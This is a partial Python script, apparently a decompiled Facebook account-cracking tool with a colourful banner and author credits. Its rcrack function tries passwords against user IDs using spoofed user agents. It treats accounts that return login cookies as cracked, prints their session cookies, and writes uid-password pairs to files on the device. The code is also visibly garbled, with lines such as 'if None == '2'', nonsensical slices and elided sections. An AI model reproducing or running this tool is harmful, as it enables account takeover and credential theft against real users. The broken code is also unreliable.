...
xxx = ("""
\033[1;91mHETARS DER BAP MD Mun  OPEN SOURCH \033[1;37m
 
88b  d88. db    db d8b   db 
88'YbdP`88 88    88 888o  88 
88  88  88 88    88 88V8o 88 
88  88  88 88    88 88 V8o88 
88  88  88 88b  d88 88  V888 
YP  YP  YP ~Y8888P' VP   V8P                                  
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m TOR BAPER   TEAM MUN OPEN SURCH MARLO  \033[0;m  ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[👬]  \033[1;32mCREATED BY\33    :  \033[1;33m Mun\33[0;m\033[1;32m
\033[1;32m[👬]  \033[1;32mFACEBOK      : \033[1;34m  Mun AHMED
\033[1;32m[👬]  \033[1;32mGITHUB       :  \033[1;35m MUN-AHMED
\033[1;32m[👬]  \033[1;32mTOOL VIRSION :  \033[1;36m 1.0.1
...
def o():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/mosaddek.90')
    print(xxx)
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-open https://facebook.com/groups/662881238071198/')
        return None
    if None == '4':
        os.system('xdg-open https://facebook.com/groups/662881238071198/')
        return None
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:66]
                print('    \033[1;32m(Mun-OK😍”¥)  ' +uid+ ' | ' +ps+    '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/Mun-OK😍.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:56]
                print('    \33[1;31m(Mun-CP😓💔•)  ' +uid+ ' | ' +ps+           '  \33[1;33m')
                open('/sdcard/Mun-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[Mun] [%s/%s]  OK😍:- %s  CP😓💔:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
